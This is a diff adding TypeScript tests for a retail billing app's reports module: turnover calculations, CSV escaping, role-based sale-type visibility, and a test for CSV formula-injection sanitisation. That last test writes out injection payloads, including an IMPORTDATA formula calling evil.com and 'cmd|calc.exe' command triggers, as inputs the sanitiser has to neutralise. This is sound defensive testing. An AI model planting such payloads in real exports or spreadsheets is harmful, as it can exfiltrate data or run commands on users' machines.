@@ -177,4 +177,80 @@ describe('Step 15 — Reports & Analytics Frontend Test Suite', () => {
       assert.equal(discrepancy, 500);
     });
   });
+
+  // ========================================================
+  // 7. Phase 2F: Statutory / CA Compliance & CSV Generation
+  // ========================================================
+  describe('7. Phase 2F: Statutory / CA Compliance & CSV Generation', () => {
+    test('should calculate Taxable Turnover strictly as Subtotal - Discount', () => {
+      const subtotal = 10000;
+      const discount = 500;
+      const taxable = Math.round((subtotal - discount + Number.EPSILON) * 100) / 100;
+      assert.equal(taxable, 9500);
+    });
+
+    test('should calculate Net Turnover strictly as Final Total - Return Amount', () => {
+      const finalTotal = 9500;
+      const returnAmount = 500;
+      const net = Math.round((finalTotal - returnAmount + Number.EPSILON) * 100) / 100;
+      assert.equal(net, 9000);
+    });
+
+    test('should escape commas, quotes, and newlines per RFC 4180 in CSV builder', async () => {
+      const { buildCsv, sanitizeCsvCell } = await import('../src/shared/utils/csv');
+      const headers = ['Bill Number', 'Customer Name', 'Notes'];
+      const rows = [
+        ['VGU-001', 'Patel, "Ahmedabad"', 'Line 1\r\nLine 2'],
+      ];
+      const csv = buildCsv(headers, rows);
+
+      assert.ok(csv.startsWith('\uFEFF'), 'CSV must be prefixed with UTF-8 BOM');
+      assert.ok(csv.includes('"Patel, ""Ahmedabad"""'), 'Must quote and escape internal quotes as ""');
+      assert.ok(csv.includes('"Line 1\r\nLine 2"'), 'Must quote multiline values');
+    });
+
+    test('should sanitize OWASP formula triggers (=, +, -, @) when not a standard number', async () => {
+      const { sanitizeCsvCell } = await import('../src/shared/utils/csv');
+
+      assert.equal(sanitizeCsvCell('=SUM(A1:B10)'), "'=SUM(A1:B10)");
+      assert.equal(sanitizeCsvCell('@IMPORTDATA("http://evil.com")'), '"\'@IMPORTDATA(""http://evil.com"")"');
+      assert.equal(sanitizeCsvCell('+cmd|calc.exe'), "'+cmd|calc.exe");
+      assert.equal(sanitizeCsvCell('-cmd|calc.exe'), "'-cmd|calc.exe");
+
+      // Standard numeric values should NOT be mangled
+      assert.equal(sanitizeCsvCell('100.50'), '100.50');
+      assert.equal(sanitizeCsvCell('-50.00'), '-50.00');
+      assert.equal(sanitizeCsvCell('+25'), '+25');
+    });
+
+    test('should verify Master Admin vs Restricted User visible sale types', () => {
+      const masterAdminUser: User = {
+        id: 'u1',
+        username: 'madmin',
+        fullName: 'Master Admin',
+        role: 'ADMIN',
+        isMasterAdmin: true,
+        allowedBillingSaleTypes: ['RETAIL', 'NRI', 'WHOLESALE'],
+        allowedReportSaleTypes: ['RETAIL', 'NRI', 'WHOLESALE'],
+      };
+
+      const restrictedUser: User = {
+        id: 'u2',
+        username: 'staff',
+        fullName: 'Staff User',
+        role: 'OUTLET',
+        isMasterAdmin: false,
+        allowedBillingSaleTypes: ['RETAIL', 'NRI', 'WHOLESALE'],
+        allowedReportSaleTypes: ['RETAIL'],
+      };
+
+      const getVisibleTypes = (u: User) =>
+        u.isMasterAdmin
+          ? ['RETAIL', 'NRI', 'WHOLESALE']
+          : u.allowedReportSaleTypes || ['RETAIL'];
+
+      assert.deepEqual(getVisibleTypes(masterAdminUser), ['RETAIL', 'NRI', 'WHOLESALE']);
+      assert.deepEqual(getVisibleTypes(restrictedUser), ['RETAIL']);
+    });
+  });
 });
